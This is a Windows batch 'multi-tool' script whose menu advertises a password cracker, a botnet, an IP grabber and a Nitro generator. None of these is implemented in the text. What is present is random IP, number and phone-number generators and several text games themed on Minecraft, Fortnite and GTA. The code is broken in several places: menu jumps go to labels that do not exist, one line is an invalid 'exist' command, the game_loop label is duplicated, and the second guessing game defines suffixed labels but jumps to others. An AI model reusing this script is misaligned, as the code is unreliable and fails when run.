echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                       [X] EXIST│
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.└────────────────────────────────────────────────────────────────────────────────────────────────┘


set /p input=">>"
if %input% EQU 1 goto IPPinger 
if %input% EQU 2 goto Password-Cracker 
if %input% EQU 3 goto Ip-Geo-Lookup 
if %input% EQU 4 goto Botnetv1
if %input% EQU x goto exist
if %input% EQU k msg * credit to ebola man  -  credit to Wock Codes  -  credit to n.x.s.x  -  credit to blurr  - good bye
if %input% EQU 5 goto IPgrabber
if %input% EQU 6 goto multi-tool-V1
if %input% EQU 7 goto Multi-Tool-V2
if %input% EQU 8 goto nitro-gen
if %input% EQU 10 goto GenerateRandomNumber
if %input% EQU 10 exist
if %input% EQU U start https://www.youtube.com/@jimisweg1971
if %input% EQU 9 goto passwordgen
if %input% EQU off goto menu

























:ipgen
@echo off
:: IP Generator - Generates a random IPv4 address

:: Generate random numbers for each octet
set /a octet1=%random% %% 256
set /a octet2=%random% %% 256
set /a octet3=%random% %% 256
set /a octet4=%random% %% 256

:: Display the random IP
echo Generated IP Address: %octet1%.%octet2%.%octet3%.%octet4%

pause









:numbergen
@echo off
:: Number Generator - Generates a random number within a given range

:: Set the minimum and maximum range values
set /a min=1
set /a max=100

:: Generate a random number between min and max
set /a range=%max% - %min% + 1
set /a random_number=%random% %% %range% + %min%

:: Display the generated number
echo Generated Number: %random_number%

pause











:Number-guessing
@echo off
:: Number Guessing Game in Batch

:: Set the range for the random number
set /a min=1
set /a max=100

:: Generate a random number between min and max
set /a range=%max% - %min% + 1
set /a secret_number=%random% %% %range% + %min%

:: Game Introduction
echo Welcome to the Number Guessing Game!
echo I have picked a random number between %min% and %max%.
echo Try to guess the number!

:: Initialize guess counter
set /a attempts=0

:guess_loop
:: Prompt the user for a guess
set /p guess=Enter your guess: 

:: Increment attempt counter
set /a attempts+=1

:: Check if the guess is correct
if %guess%==%secret_number% (
    echo Congratulations! You guessed the correct number in %attempts% attempts.
    goto end_game
) else (
    if %guess% lss %secret_number% (
        echo Your guess is too low. Try again!
    ) else (
        echo Your guess is too high. Try again!
    )
)

:: Loop back to prompt the user for another guess
goto guess_loop

:end_game
pause







































:Minecraft-game
@echo off
:: Simple Minecraft Themed Text Game in Batch

:: Initialize variables
set /a inventory_wood=0
set /a inventory_stone=0
set /a inventory_iron=0
set /a inventory_gold=0
set /a inventory_diamond=0
set /a health=10

:: Game loop
:game_start
cls
echo Welcome to the Minecraft Text Game!
echo Your goal is to mine resources and manage your inventory.
echo.
echo Inventory:
echo Wood: %inventory_wood%
echo Stone: %inventory_stone%
echo Iron: %inventory_iron%
echo Gold: %inventory_gold%
echo Diamond: %inventory_diamond%
echo Health: %health%
echo.
echo What would you like to do?
echo 1. Mine for resources
echo 2. Craft items
echo 3. Check Inventory
echo 4. Quit the game
set /p action="Choose an action (1-4): "

if "%action%"=="1" goto mine
if "%action%"=="2" goto craft
if "%action%"=="3" goto inventory
if "%action%"=="4" goto quit

goto game_start

:: Mining Section
:mine
cls
echo You are mining...
echo.
:: Simulate mining with random chance for different resources
set /a random=%random% %% 10

if %random% lss 3 (
    set /a inventory_wood+=1
    echo You found 1 piece of wood.
) else if %random% lss 6 (
    set /a inventory_stone+=1
    echo You found 1 piece of stone.
) else if %random% lss 8 (
    set /a inventory_iron+=1
    echo You found 1 piece of iron.
) else if %random% lss 9 (
    set /a inventory_gold+=1
    echo You found 1 piece of gold.
) else (
    set /a inventory_diamond+=1
    echo You found 1 diamond!
)

:: Simulate a random health change (you might lose health from accidents while mining)
set /a health_change=%random% %% 3
if %health_change%==0 (
    set /a health-=1
    echo You hurt yourself mining and lost 1 health.
)

:: Check if health reaches 0
if %health% leq 0 (
    echo You have run out of health and died!
    pause
    exit
)

pause
goto game_start

:: Crafting Section
:craft
cls
echo Crafting items...
echo.
echo What would you like to craft?
echo 1. Craft a Wooden Pickaxe (Requires 3 wood)
echo 2. Craft an Iron Pickaxe (Requires 3 iron)
set /p craft_action="Choose an item to craft (1-2): "

if "%craft_action%"=="1" (
    if %inventory_wood% geq 3 (
        set /a inventory_wood-=3
        echo You crafted a Wooden Pickaxe!
    ) else (
        echo You don't have enough wood to craft a Wooden Pickaxe!
    )
)

if "%craft_action%"=="2" (
    if %inventory_iron% geq 3 (
        set /a inventory_iron-=3
        echo You crafted an Iron Pickaxe!
    ) else (
        echo You don't have enough iron to craft an Iron Pickaxe!
    )
)

pause
goto game_start

:: Inventory Section
:inventory
cls
echo Your Inventory:
echo Wood: %inventory_wood%
echo Stone: %inventory_stone%
echo Iron: %inventory_iron%
echo Gold: %inventory_gold%
echo Diamond: %inventory_diamond%
echo Health: %health%
pause
goto game_start

:: Quit Game
:quit
cls
echo Thanks for playing! Goodbye!
pause
exit

















































:fortnitegame
@echo off
:: Fortnite Battle Royale Text Game in Batch

:: Initialize variables
set /a player_health=100
set /a enemy_health=100
set /a player_damage=0
set /a enemy_damage=0
set /a round=1

:: Game introduction
cls
echo Welcome to the Fortnite Battle Royale Text Game!
echo.
echo Your goal is to survive and defeat the enemy.
echo.
echo You will take turns choosing actions like attacking, defending, and healing.
echo.
pause

:: Game loop
:game_loop
cls
echo Round %round%
echo ----------------------------
echo Your Health: %player_health%
echo Enemy Health: %enemy_health%
echo.
echo What would you like to do?
echo 1. Attack (Deal damage to the enemy)
echo 2. Defend (Reduce damage from enemy)
echo 3. Heal (Restore health)
echo 4. Check Stats (View player stats)

set /p action="Choose an action (1-4): "

:: Action handling
if "%action%"=="1" goto attack
if "%action%"=="2" goto defend
if "%action%"=="3" goto heal
if "%action%"=="4" goto stats
goto game_loop

:: Attack action
:attack
cls
echo You attack the enemy!
:: Random damage between 5 and 20
set /a player_damage=%random% %% 16 + 5
set /a enemy_health-=player_damage
echo You dealt %player_damage% damage to the enemy!
echo.
:: Enemy retaliates
set /a enemy_damage=%random% %% 10 + 5
set /a player_health-=enemy_damage
echo The enemy attacks you and deals %enemy_damage% damage!
echo.

:: Check if the game is over
if %player_health% leq 0 (
    echo You have been defeated! Game Over!
    pause
    exit
)
if %enemy_health% leq 0 (
    echo You defeated the enemy! You win!
    pause
    exit
)

set /a round+=1
pause
goto game_loop

:: Defend action
:defend
cls
echo You choose to defend!
:: Reduce enemy damage by a factor of 2
set /a enemy_damage=%random% %% 10 + 5
set /a reduced_damage=enemy_damage / 2
set /a player_health-=reduced_damage
echo The enemy attacks, but you defended and took %reduced_damage% damage!
echo.

:: Check if the game is over
if %player_health% leq 0 (
    echo You have been defeated! Game Over!
    pause
    exit
)
if %enemy_health% leq 0 (
    echo You defeated the enemy! You win!
    pause
    exit
)

set /a round+=1
pause
goto game_loop

:: Heal action
:heal
cls
echo You choose to heal yourself!
:: Heal between 10 and 30 health points
set /a heal_amount=%random% %% 21 + 10
set /a player_health+=heal_amount
echo You restored %heal_amount% health!
echo.

:: Enemy attacks after healing
set /a enemy_damage=%random% %% 10 + 5
set /a player_health-=enemy_damage
echo The enemy attacks you and deals %enemy_damage% damage!
echo.

:: Check if the game is over
if %player_health% leq 0 (
    echo You have been defeated! Game Over!
    pause
    exit
)
if %enemy_health% leq 0 (
    echo You defeated the enemy! You win!
    pause
    exit
)

set /a round+=1
pause
goto game_loop

:: Stats action
:stats
cls
echo Player Stats:
echo ---------------------
echo Health: %player_health%
echo Damage dealt: %player_damage%
echo.
echo Enemy Stats:
echo -------------------
echo Health: %enemy_health%
echo Damage dealt: %enemy_damage%
pause
goto game_loop




































:gta5game
@echo off
:: Grand Theft Auto (GTA)-Inspired Text RPG Game in Batch

:: Initialize variables
set /a health=100
set /a money=500
set /a ammo=10
set /a round=1
set /a enemy_health=100
set /a mission_complete=0

:: Game Introduction
cls
echo Welcome to the GTA-Inspired RPG Game!
echo.
echo You are a criminal in the city trying to make money, complete missions, and survive.
echo You can perform actions such as robbing, fighting enemies, or completing missions.
echo.
echo Your stats:
echo Health: %health%
echo Money: $%money%
echo Ammo: %ammo%
echo.
pause

:: Game loop
:game_loop
cls
echo Round %round%
echo -----------------------------
echo Your Health: %health%
echo Money: $%money%
echo Ammo: %ammo%
echo.
echo What would you like to do?
echo 1. Go on a mission
echo 2. Rob a store
echo 3. Fight a random enemy
echo 4. Check stats
echo 5. Exit the game

set /p action="Choose an action (1-5): "

if "%action%"=="1" goto mission
if "%action%"=="2" goto rob_store
if "%action%"=="3" goto fight
if "%action%"=="4" goto stats
if "%action%"=="5" goto quit

goto game_loop

:: Mission Section
:mission
cls
echo You are now on a mission to steal a car.
echo You need to complete the mission and escape the police!
echo.
set /a mission_outcome=%random% %% 3

if %mission_outcome%==0 (
    echo Mission failed! You got caught by the police. You lost $200.
    set /a money-=200
) else if %mission_outcome%==1 (
    echo Mission successful! You completed the mission and earned $500.
    set /a money+=500
) else (
    echo Mission failed! You were injured during the mission and lost 20 health.
    set /a health-=20
)

:: Check if the player is dead
if %health% leq 0 (
    echo You died during the mission. Game Over!
    pause
    exit
)

set /a round+=1
pause
goto game_loop

:: Rob Store Section
:rob_store
cls
echo You are robbing a store. The clerk hands over the money, but the police are coming!
echo.
set /a robbery_outcome=%random% %% 2

if %robbery_outcome%==0 (
    echo You successfully robbed the store and earned $300.
    set /a money+=300
    echo You escaped before the police arrived.
) else (
    echo The police caught you! You lost $100 and 30 health from your injuries.
    set /a money-=100
    set /a health-=30
)

:: Check if the player is dead
if %health% leq 0 (
    echo You died during the robbery. Game Over!
    pause
    exit
)

set /a round+=1
pause
goto game_loop

:: Fight Section
:fight
cls
echo You are fighting a random enemy!
echo The enemy has %enemy_health% health.
echo You have %health% health and %ammo% bullets.

:: Check if player has ammo
if %ammo% leq 0 (
    echo You don't have any ammo left! You have to fight hand-to-hand!
    set /a enemy_damage=%random% %% 20 + 10
    set /a player_damage=%random% %% 10 + 5
    set /a health-=enemy_damage
    set /a enemy_health-=player_damage
    echo You dealt %player_damage% damage to the enemy.
    echo The enemy dealt %enemy_damage% damage to you.
) else (
    set /a enemy_damage=%random% %% 20 + 10
    set /a player_damage=%random% %% 15 + 10
    set /a ammo-=1
    set /a health-=enemy_damage
    set /a enemy_health-=player_damage
    echo You fired a shot and dealt %player_damage% damage to the enemy.
    echo The enemy fired back and dealt %enemy_damage% damage to you.
)

:: Check if the player or enemy is dead
if %health% leq 0 (
    echo You lost the fight and died. Game Over!
    pause
    exit
)

if %enemy_health% leq 0 (
    echo You defeated the enemy! You earned $200.
    set /a money+=200
)

set /a round+=1
pause
goto game_loop

:: Stats Section
:stats
cls
echo Your Stats:
echo -------------
echo Health: %health%
echo Money: $%money%
echo Ammo: %ammo%
echo.
echo Enemy Stats:
echo -------------
echo Enemy Health: %enemy_health%
pause
goto game_loop

:: Quit Game Section
:quit
cls
echo Thank you for playing the GTA-Inspired RPG Game!
echo Goodbye!
pause
exit






















:phoneNumber
@echo off
:: Random Phone Number Generator in Batch

:: Generate random area code (3 digits)
set /a area_code=%random% %% 900 + 100

:: Generate random first 3 digits of the phone number (3 digits)
set /a first_part=%random% %% 900 + 100

:: Generate random last 4 digits of the phone number (4 digits)
set /a second_part=%random% %% 10000

:: Format phone number and display it
echo Random Phone Number: (%area_code%) %first_part%-%second_part%

pause
exit







:Number-guessingv2
@echo off
cls
:: Cool Magic Number Guessing Game in Batch

:: Set game parameters
set /a "target=%random% %% 100 + 1"
set /a attempts=0
set /a max_attempts=10

:: ASCII Art for Game Intro
echo ***********************************************
echo *                                             *
echo *      Welcome to the Magic Number Game!      *
echo *                                             *
echo ***********************************************
echo.
echo Guess the magic number between 1 and 100.
echo You have %max_attempts% attempts to guess it correctly.
echo.

:: Game loop
:game_loop22
set /a attempts+=1

:: Ask player for input
set /p "guess=Enter your guess (1-100): "

:: Check if the guess is valid
if not "%guess%"=="" (
    if %guess% lss 1 (
        echo Please enter a number between 1 and 100.
        goto game_loop
    )
    if %guess% gtr 100 (
        echo Please enter a number between 1 and 100.
        goto game_loop
    )
) else (
    echo You didn't enter anything. Please enter a number.
    goto game_loop
)

:: Check if the guess is correct
if %guess%==%target% (
    cls
    echo ***********************************************
    echo *                                             *
    echo *     Congratulations! You guessed it!       *
    echo *      The magic number was %target%.       *
    echo *                                             *
    echo ***********************************************
    echo.
    echo You guessed the number in %attempts% attempts!
    echo.
    goto play_again
) else (
    if %guess% lss %target% (
        echo Too low! Try again.
    ) else (
        echo Too high! Try again.
    )
)

:: Check if the player has used all attempts
if %attempts% geq %max_attempts% (
    cls
    echo ***********************************************
    echo *                                             *
    echo *     Sorry, you've run out of attempts!     *
    echo *     The magic number was %target%.         *
    echo *                                             *
    echo ***********************************************
    echo.
    goto play_again
)

:: Continue the game if the player still has attempts left
goto game_loop

:: Play Again Option
:play_again22
set /p "play=Do you want to play again? (Y/N): "
if /i "%play%"=="Y" goto restart
if /i "%play%"=="N" goto end_game

:: Restart the game
:restart22
cls
echo Restarting the game...
set /a "target=%random% %% 100 + 1"
set /a attempts=0
goto game_loop

:: End the game
:end_game22
cls
echo ***********************************************
echo *                                             *
echo *     Thanks for playing the Magic Number     *
echo *                Guessing Game!              *
echo *                                             *
echo ***********************************************
pause
exit
